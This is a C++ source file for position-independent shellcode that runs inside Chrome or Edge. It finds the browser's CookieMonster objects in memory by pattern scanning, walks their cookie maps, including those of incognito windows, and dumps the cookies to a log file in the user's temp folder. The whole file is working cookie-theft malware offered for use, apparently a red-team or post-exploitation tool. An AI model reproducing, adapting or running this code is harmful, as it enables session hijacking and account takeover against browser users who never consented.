
#include <Windows.h>
#include "Helper.h"
#include "GetProcAddress.h"
#include "FileIO.h"
#include "Memory.h"
#include "win32.h"

extern "C" {
	void _code() {

		//Uncomment me for Edge
		//PICWARR(targetModule, "msedge.dll");
		//Pointers ctx = { Config::Edge };

		//Uncomment me for Chrome
		PICWARR(targetModule, "chrome.dll");
		 Pointers ctx = { Config::Chrome };
		 
		//File path will be "C:\Users\<Chrome_user>\AppData\Local\Temp\cookies.log"
		PICARR(outputFileName, "cookies.log");

		if (!InitPointers(&ctx, outputFileName))
			return;

		PICARR(initdone, "[+] Init done");
		WriteLineToFile(initdone , &ctx);

		if (ctx.targetConfig == Config::Chrome) {
			PICARR(configText, "[*] Using configuration: Chrome");
			WriteLineToFile(configText, &ctx);
		}
		else {
			PICARR(configText, "[*] Using configuration: Edge");
			WriteLineToFile(configText, &ctx);
		}

		BYTE pattern[] = {
			0xAA, 0xAA, 0xAA, 0xAA, 0xCC, 0xCC, 0xCC, 0xCC, 0xAA, 0xAA, 0xAA, 0xAA, 0xBB, 0xBB, 0xBB, 0xBB,
			0xAA, 0xAA, 0xAA, 0xAA, 0xBB, 0xBB, 0xBB, 0xBB, 0xAA, 0xAA, 0xAA, 0x00, 0x00, 0x00, 0x00, 0x00,
			0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xAA, 0xAA, 0xAA, 0x00, 0x00, 0x00, 0x00, 0x00,
			0xAA, 0xAA, 0xAA, 0xAA, 0xBB, 0xBB, 0xBB, 0xBB, 0xAA, 0xAA, 0xAA, 0xAA, 0xBB, 0xBB, 0xBB, 0xBB,
			0xAA, 0xAA, 0xAA, 0x00, 0x00, 0x00, 0x00, 0x00, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA,
			0xAA, 0xAA, 0xAA, 0xAA, 0xBB, 0xBB, 0xBB, 0xBB, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA,
			0xAA, 0xAA, 0xAA, 0x00, 0x00, 0x00, 0x00, 0x00, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA,
			0xAA, 0xAA, 0xAA, 0xAA, 0x00, 0x00, 0x00, 0x00, 0xAA, 0xAA, 0xAA, 0xAA, 0x00, 0x00, 0x00, 0x00,
			0xAA, 0xAA, 0xAA, 0xAA, 0x00, 0x00, 0x00, 0x00, 0xAA, 0xAA, 0xAA, 0xAA, 0x00, 0x00, 0x00, 0x00,
			0xAA, 0xAA, 0xAA, 0xAA, 0xBB, 0xBB, 0xBB, 0xBB
		};

		uintptr_t chromeDlladdress = 0;
		DWORD modulesize = 0;
		chromeDlladdress = (uintptr_t)GetLoadedDLLBasePEB(targetModule);
		if (chromeDlladdress == NULL)
		{
			PICARR(failed, "[-] Target module not found");
			WriteLineToFile(failed, &ctx);
			CloseFileHandle(&ctx);
			return;
		}

		PICARR(targetModuletext1, "[+] Target module ");
		WriteToFile(targetModuletext1, &ctx);
		WriteToFileW(targetModule, &ctx);
		PICARR(targetModuletext2, " found at: ");
		WriteToFile(targetModuletext2, &ctx);
		WriteHexLineToFile((const unsigned char*)&chromeDlladdress, sizeof(uintptr_t), &ctx);

		uintptr_t targetSection = 0;
		if (!FindLargestSection(chromeDlladdress, targetSection, &ctx))
		{
			PICARR(failed, "[-] Failed to find the largest section");
			WriteLineToFile(failed, &ctx);
			CloseFileHandle(&ctx);
			return;
		}

		PICARR(targetSectionText, "[+] Found target section: ");
		WriteToFile(targetSectionText, &ctx);
		WriteHexLineToFile((const unsigned char*)&targetSection, sizeof(uintptr_t), &ctx);

		BYTE chromeDllPattern[sizeof(uintptr_t)];
		ConvertToByteArray(targetSection, chromeDllPattern, sizeof(uintptr_t));

		//Patch in the base address
		PatchPattern(pattern, chromeDllPattern, 8);

		uintptr_t* CookieMonsterInstances = (uintptr_t*)MyHeapAlloc(sizeof(uintptr_t) * 1000, &ctx);
		size_t szCookieMonster = 0;
		if (CookieMonsterInstances == NULL || !FindPattern(pattern, sizeof(pattern), CookieMonsterInstances, szCookieMonster, &ctx))
		{
			PICARR(failed, "[-] Failed to find pattern\n");
			WriteLineToFile(failed, &ctx);
			MyHeapFree(CookieMonsterInstances, &ctx);
			CloseFileHandle(&ctx);
			return;
		}

		PICARR(found, "[+] Found ");
		WriteToFile(found, &ctx);
		WriteHexToFile((const unsigned char*)&szCookieMonster, sizeof(size_t), &ctx);
		PICARR(found1, " instances of CookieMonster");
		WriteLineToFile(found1, &ctx);

		//Each incognito window will have their own instance of the CookieMonster, and that is why we need to find and loop them all
		for (size_t i = 0; i < szCookieMonster; i++) {
			if (CookieMonsterInstances == NULL || CookieMonsterInstances[i] == NULL)
				break;
			uintptr_t CookieMapOffset = 0x28; //This offset is fixed since the data just is there like it is
			CookieMapOffset += CookieMonsterInstances[i] + sizeof(uintptr_t); //Include the length of the result address as well
			WalkCookieMap(CookieMapOffset, &ctx);
		}

		//Done
		MyHeapFree(CookieMonsterInstances, &ctx);
		PICARR(done, "[+] Done");
		WriteLineToFile(done, &ctx);
		CloseFileHandle(&ctx);

		return;
	}
}